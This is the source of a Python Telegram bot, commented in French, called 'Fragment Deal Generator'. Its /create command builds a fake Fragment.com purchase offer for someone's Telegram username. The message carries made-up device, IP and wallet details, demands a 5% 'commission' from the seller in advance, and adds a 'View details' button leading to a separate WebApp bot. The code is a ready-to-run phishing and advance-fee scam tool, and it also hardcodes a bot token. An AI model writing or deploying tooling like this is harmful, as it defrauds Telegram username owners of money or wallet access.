import asyncio
import aiohttp
import sys
import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.error import NetworkError, TimedOut, Conflict
from telegram.helpers import escape_markdown

# Configuration simple du logging
import logging
import warnings
warnings.filterwarnings("ignore", category=RuntimeWarning)
logging.basicConfig(level=logging.ERROR)

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
FIXED_CHAT_ID = 511758924
PORT = int(os.getenv('PORT', 10000))

print(f"üîç DEBUG: BOT_TOKEN configur√©: ‚úÖ")
print(f"üîç DEBUG: CHAT_ID fixe: {FIXED_CHAT_ID}")
print(f"üîç DEBUG: PORT: {PORT}")

# ===== SERVEUR HTTP POUR RENDER =====
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path in ['/', '/health']:
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            html_content = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Fragment Bot Status</title>
                <meta charset="utf-8">
            </head>
            <body>
                <h1>ü§ñ Fragment Deal Generator</h1>
                <p>‚úÖ Bot is running successfully!</p>
                <p>üîó Telegram: @BidRequestWebApp_bot</p>
                <p>üìä Status: Active</p>
            </body>
            </html>
            """
            self.wfile.write(html_content.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass

def start_health_server():
    """D√©marre le serveur de sant√© pour Render"""
    try:
        server = HTTPServer(('0.0.0.0', PORT), HealthCheckHandler)
        print(f"üåê Serveur de sant√© d√©marr√© sur port {PORT}")
        server.serve_forever()
    except Exception as e:
        print(f"‚ùå Erreur serveur de sant√©: {e}")

# ===== FONCTION PRIX TON =====
async def get_ton_price():
    """R√©cup√®re le prix du TON en USD via l'API DIA"""
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(
                "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    price = float(data.get('Price', 5.50))
                    if price > 0:
                        return price
                    else:
                        return 5.50
                else:
                    return 5.50
    except Exception:
        return 5.50

# ===== FONCTION G√âN√âRATION MESSAGE =====
async def generate_fragment_message(username, price):
    """G√©n√®re le message Fragment avec formatage s√©curis√©"""
    try:
        # Calculs
        commission = price * 0.05
        ton_to_usd = await get_ton_price()
        price_usd = price * ton_to_usd
        commission_usd = commission * ton_to_usd
        
        # Nettoyage et validation du username
        clean_username = str(username).strip().replace('@', '').upper()
        
        # Message avec formatage s√©curis√© (pas de Markdown probl√©matique)
        message = f"""We have received a purchase request for your username @{clean_username} via Fragment.com. Below are the transaction details:

‚Ä¢ Offer Amount: üíé{price:g} TON (${price_usd:.2f} USD)
‚Ä¢ Commission: üíé{commission:g} TON (${commission_usd:.2f} USD)

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
‚Ä¢ Device: Safari on macOS  
‚Ä¢ IP Address: 103.56.72.245
‚Ä¢ Wallet: EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U

Important:
‚Ä¢ Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
‚Ä¢ If you choose not to proceed, simply ignore this message."""

        # Bouton vers WebApp
        button_url = f"https://t.me/BidRequestWebApp_bot/WebApp?startapp={clean_username.lower()}-{price:g}"
        keyboard = [[InlineKeyboardButton("View details", url=button_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        return message, reply_markup
        
    except Exception as e:
        print(f"Erreur g√©n√©ration message: {e}")
        return None, None

# ===== GESTIONNAIRE D'ERREURS =====
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestionnaire d'erreurs pour √©viter les crashes"""
    try:
        error_msg = str(context.error)
        if "Conflict" in error_msg:
            print("‚ö†Ô∏è Conflit d√©tect√© - instance multiple")
        else:
            print(f"‚ö†Ô∏è Erreur g√©r√©e: {error_msg}")
    except:
        pass

# ===== COMMANDES TELEGRAM =====
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /start"""
    try:
        if not update or not update.message:
            return
            
        user = update.effective_user
        chat_id = update.effective_chat.id
        
        message = f"""ü§ñ Fragment Deal Generator

Bonjour {user.first_name}! 

üì± Votre Chat ID: {chat_id}

Ce bot g√©n√®re automatiquement des messages Fragment personnalis√©s.

Commandes disponibles:
‚Ä¢ /create username price - Cr√©er un message Fragment
‚Ä¢ /help - Aide

üíé Pr√™t √† cr√©er vos deals!"""
        
        await update.message.reply_text(message)
        print(f"‚úÖ /start - {user.first_name} ({chat_id})")
        
    except Exception as e:
        print(f"Erreur start: {e}")

async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /create username price"""
    try:
        if not update or not update.message:
            return
            
        if len(context.args) != 2:
            await update.message.reply_text(
                "‚ùå Usage: /create username price\n"
                "üìù Exemple: /create crypto 1000"
            )
            return
            
        username = str(context.args[0]).strip().lower().replace('@', '')
        
        try:
            price = float(context.args[1])
        except ValueError:
            await update.message.reply_text("‚ùå Format de prix invalide. Utilisez des nombres.")
            return
        
        if price <= 0:
            await update.message.reply_text("‚ùå Le prix doit √™tre sup√©rieur √† 0")
            return
            
        if price > 1000000:
            await update.message.reply_text("‚ùå Prix trop √©lev√© (max: 1,000,000 TON)")
            return
            
        # Message de traitement
        processing_msg = await update.message.reply_text("‚è≥ G√©n√©ration du deal en cours...")
        
        # G√©n√©ration du message
        message, reply_markup = await generate_fragment_message(username, price)
        
        if message and reply_markup:
            # Envoi du message principal
            await update.message.reply_text(
                message,
                reply_markup=reply_markup
            )
            
            # Confirmation
            await update.message.reply_text(
                f"‚úÖ Deal cr√©√© avec succ√®s!\n"
                f"üéØ @{username.upper()} - {price:g} TON"
            )
            
            print(f"‚úÖ Deal: @{username} - {price} TON")
            
            # Suppression du message de traitement
            try:
                await processing_msg.delete()
            except:
                pass
                
        else:
            await update.message.reply_text("‚ùå Erreur lors de la g√©n√©ration du message")
            
    except Exception as e:
        print(f"Erreur create: {e}")
        try:
            await update.message.reply_text("‚ùå Erreur syst√®me. Veuillez r√©essayer.")
        except:
            pass

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande d'aide"""
    try:
        if not update or not update.message:
            return
            
        help_text = """ü§ñ Fragment Deal Generator - Aide

Commandes disponibles:
‚Ä¢ /start - Informations du bot
‚Ä¢ /create username price - Cr√©er un deal Fragment
‚Ä¢ /help - Afficher cette aide

Exemple d'utilisation:
/create crypto 1500

√Ä propos:
Ce bot g√©n√®re des messages Fragment professionnels avec calculs automatiques en TON et USD.

üíé Bot pr√™t √† l'emploi!"""
        
        await update.message.reply_text(help_text)
        print("‚úÖ Help affich√©")
        
    except Exception as e:
        print(f"Erreur help: {e}")

# ===== FONCTION PRINCIPALE BOT =====
def run_telegram_bot_sync():
    """Lance le bot Telegram en mode synchrone"""
    attempt = 0
    max_attempts = 3
    
    while attempt < max_attempts:
        attempt += 1
        try:
            print(f"üöÄ Tentative de d√©marrage #{attempt}...")
            
            # Configuration de l'application
            app = Application.builder().token(BOT_TOKEN).build()
            
            # Ajout des handlers
            app.add_error_handler(error_handler)
            app.add_handler(CommandHandler("start", start_command))
            app.add_handler(CommandHandler("create", create_command))
            app.add_handler(CommandHandler("help", help_command))
            
            print("‚úÖ Bot configur√©")
            print(f"üíé Chat ID configur√©: {FIXED_CHAT_ID}")
            print("üîó WebApp: BidRequestWebApp_bot/WebApp")
            print("\nüìã Commandes disponibles:")
            print("   ‚Ä¢ /start - D√©marrer le bot")
            print("   ‚Ä¢ /create username price - Cr√©er un deal")
            print("   ‚Ä¢ /help - Aide")
            print("üîÑ D√©marrage du polling...")
            
            # D√©marrage en mode bloquant
            app.run_polling(
                poll_interval=3.0,
                timeout=15,
                bootstrap_retries=3,
                read_timeout=15,
                write_timeout=15,
                connect_timeout=15,
                pool_timeout=15,
                drop_pending_updates=True,
                allowed_updates=['message'],
                close_loop=True
            )
            
            print("üõë Bot arr√™t√© normalement")
            break
            
        except Conflict as e:
            print(f"‚ùå Conflit (tentative {attempt}): {e}")
            if attempt < max_attempts:
                print(f"‚è≥ Attente 30s avant nouvelle tentative...")
                import time
                time.sleep(30)
            else:
                print("‚ùå Abandon apr√®s plusieurs tentatives de conflit")
                
        except KeyboardInterrupt:
            print("\nüõë Arr√™t demand√© par l'utilisateur")
            break
            
        except Exception as e:
            print(f"‚ùå Erreur (tentative {attempt}): {e}")
            if attempt < max_attempts:
                import time
                time.sleep(10)
            else:
                print("‚ùå Abandon apr√®s plusieurs erreurs")
                
    print("üîö Nettoyage termin√©")

# ===== FONCTION PRINCIPALE =====
def main():
    """Point d'entr√©e principal"""
    print("üöÄ D√©marrage Fragment Deal Generator...")
    print(f"üåê URL publique: https://telegram-bot-vic3.onrender.com")
    
    try:
        # 1. D√©marrage du serveur HTTP en arri√®re-plan
        health_thread = threading.Thread(target=start_health_server, daemon=True)
        health_thread.start()
        print("‚úÖ Serveur de sant√© d√©marr√©")
        
        # 2. Attente pour s'assurer que le serveur d√©marre
        import time
        time.sleep(3)
        
        # 3. Lancement du bot Telegram
        print("ü§ñ Lancement du bot Telegram...")
        run_telegram_bot_sync()
        
    except KeyboardInterrupt:
        print("\nüõë Arr√™t par l'utilisateur")
        
    except Exception as e:
        print(f"‚ùå Erreur critique: {e}")
        
    finally:
        print("üîö Application termin√©e")

if __name__ == '__main__':
    main()
